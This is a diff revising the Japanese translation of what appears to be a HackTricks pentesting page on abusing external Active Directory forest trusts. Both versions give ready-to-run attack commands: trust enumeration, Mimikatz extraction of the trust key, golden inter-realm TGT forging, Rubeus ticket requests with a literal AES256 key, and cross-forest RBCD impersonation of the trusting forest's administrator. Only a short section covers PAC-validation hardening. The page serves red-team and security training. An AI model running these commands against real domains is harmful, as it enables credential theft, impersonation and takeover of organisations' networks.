@@ -1,12 +1,12 @@
-# 外部フォレストドメイン - OneWay (Inbound) または 双方向
+# External Forest Domain - OneWay（Inbound）または bidirectional
 
 {{#include ../../banners/hacktricks-training.md}}
 
-このシナリオでは、外部ドメインがあなたを信頼している（または双方が相互に信頼している）ため、そのドメインに対して何らかのアクセスが可能になります。
+このシナリオでは、external domain があなたを trust している（または相互に trust している）ため、そのドメインに対して何らかの access を取得できます。
 
-## 列挙
+## Enumeration
 
-まずは、**信頼**を**列挙**することが必要です：
+まず、**trust** を **enumerate** する必要があります：
 ```bash
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
@@ -59,15 +59,15 @@ IsDomain     : True
 # Additional trust hygiene checks (AD RSAT / AD module)
 Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
 ```
-> `SelectiveAuthentication`/`SIDFiltering*` は、追加の前提条件なしにクロスフォレストの悪用パス（RBCD、SIDHistory）が有効かどうかを素早く確認できます。
+> `SelectiveAuthentication`/`SIDFiltering*` を使うと、追加の前提条件なしで、cross-forest abuse paths（RBCD、SIDHistory）が機能する可能性をすばやく確認できます。<sup>[[2]](#references)</sup>
 
-In the previous enumeration it was found that the user **`crossuser`** is inside the **`External Admins`** group who has **Admin access** inside the **DC of the external domain**.
+前回の enumeration で、ユーザー **`crossuser`** が、**外部ドメインの DC** 内で **Admin access** を持つ **`External Admins`** グループに所属していることが判明しました。
 
-## 初期アクセス
+## Initial Access
 
-もし他ドメインで自分のユーザーに対して何か**特別な**アクセスを見つけられなかった場合でも、AD Methodology に戻って、**privesc from an unprivileged user**（例えば kerberoasting のような手法）を試すことができます：
+他のドメインでユーザーに **special** なアクセス権を見つけられなかった場合でも、AD Methodology に戻り、**unprivileged user** から **privesc** を試すことができます（例えば kerberoasting など）。
 
-You can use **Powerview functions** to **enumerate** the **other domain** using the `-Domain` param like in:
+`-Domain` param を使用して、以下のように **Powerview functions** で **他のドメイン** を **enumerate** できます：
 ```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
@@ -75,28 +75,28 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ./
 {{#endref}}
 
-## なりすまし
+## Impersonation
 
 ### ログイン
 
-外部ドメインにアクセス権を持つユーザーの資格情報を使用して通常の方法でログインすれば、以下にアクセスできるはずです:
+外部ドメインへのアクセス権を持つユーザーの認証情報を通常の方法で使用すれば、アクセスできるはずです。
 ```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
-### SID History の悪用
+### SID History Abuse
 
-フォレストトラストを横断して[**SID History**](sid-history-injection.md)を悪用することもできます。
+forest trust を介して [**SID History**](sid-history-injection.md) を abuse することもできます。
 
-ユーザーが**あるフォレストから別のフォレストへ移行**され、かつ**SID Filteringが有効になっていない**場合、他のフォレストの**SIDを追加**できるようになり、この**SID**はトラストを介して認証する際に**ユーザーのトークン**に**追加**されます。
+ユーザーが **ある forest から別の forest へ** migration され、**SID Filtering が有効化されていない**場合、**他方の forest の SID** を **追加**できるようになり、この **SID** は **trust を介して authentication** する際に **ユーザーの token** に **追加**されます。
 
 > [!WARNING]
-> 補足として、署名キーは次のコマンドで取得できます
+> 念のため、以下のコマンドで signing key を取得できます。
 >
 > ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-現在のドメインのユーザーをインパーソネートする**TGT**に、**trusted**キーで**署名する**ことができます。
+**trusted** key で **sign** し、現在の domain のユーザーを **impersonating** する **TGT** を作成できます。
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -107,7 +107,7 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### ユーザーを完全になりすます方法
+### ユーザーを完全に偽装する方法
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -121,9 +121,9 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### Cross-forest RBCD 信頼フォレストでマシンアカウントを制御している場合 (no SID filtering / selective auth)
+### 信頼フォレスト内のコンピューターアカウントを制御している場合の Cross-forest RBCD（SID filtering / selective auth なし）
 
-もしあなたの foreign principal (FSP) が信頼フォレスト内でコンピュータオブジェクトを書き込めるグループ（例: `Account Operators`、カスタムプロビジョニンググループ）に入ると、当該フォレストのターゲットホストで **Resource-Based Constrained Delegation** を設定し、そこで任意のユーザーになりすますことができます:
+foreign principal（FSP）によって、信頼フォレスト内のコンピューターオブジェクトに書き込み可能なグループ（例: `Account Operators`、カスタムのプロビジョニンググループ）に所属できる場合、そのフォレストの対象ホストに **Resource-Based Constrained Delegation** を設定し、そこで任意のユーザーになりすますことができます:
 ```bash
 # 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
 # 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
@@ -134,16 +134,15 @@ Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=
 # 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
 Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
 ```
-これは **SelectiveAuthentication is disabled** かつ **SID filtering** があなたの制御する SID を削除しない場合にのみ機能します。SIDHistory forging を回避する高速な横移動経路で、トラストレビューで見落とされることが多いです。
+これは、**SelectiveAuthentication が無効**で、かつ **SID filtering** によって制御対象の SID が除去されない場合にのみ機能します。SIDHistory forging を回避できる高速な lateral path であり、trust のレビューで見落とされることがよくあります。<sup>[[2]](#references)</sup>
 
-### PAC 検証の強化
+### PAC validation の hardening
 
-PAC署名検証の更新（**CVE-2024-26248**/**CVE-2024-29056**）により、inter-forest チケットで署名の強制が追加されます。**Compatibility mode** では、偽造された inter-realm PAC/SIDHistory/S4U パスが未パッチの DCs で依然として動作することがあります。**Enforcement mode** では、unsigned または改ざんされた PAC データが forest trust を越えて渡ると拒否されます（対象フォレストのトラストキーを所有している場合を除く）。レジストリオーバーライド（`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`）が利用可能な間はこれを弱めることができます。
+**CVE-2024-26248**/**CVE-2024-29056** に対する PAC signature validation の更新により、inter-forest ticket で signing enforcement が追加されます。**Compatibility mode** では、未適用の DC に対して forged inter-realm PAC/SIDHistory/S4U path が依然として機能する可能性があります。**Enforcement mode** では、forest trust をまたぐ unsigned または改ざんされた PAC data は、対象 forest の trust key も保持していない限り拒否されます。Registry overrides（`PacSignatureValidationLevel`、`CrossDomainFilteringLevel`）が引き続き利用可能な間は、これによってこの enforcement を弱めることができます。<sup>[[1]](#references)</sup>
 
+## References
 
+- [1] [Microsoft KB5037754 – CVE-2024-26248 および CVE-2024-29056 に関連する PAC validation の変更](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
+- [2] [MS-PAC spec – SID filtering と claims transformation の詳細](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
 
-## 参考資料
-
-- [Microsoft KB5037754 – PAC validation changes for CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
-- [MS-PAC spec – SID filtering & claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
 {{#include ../../banners/hacktricks-training.md}}
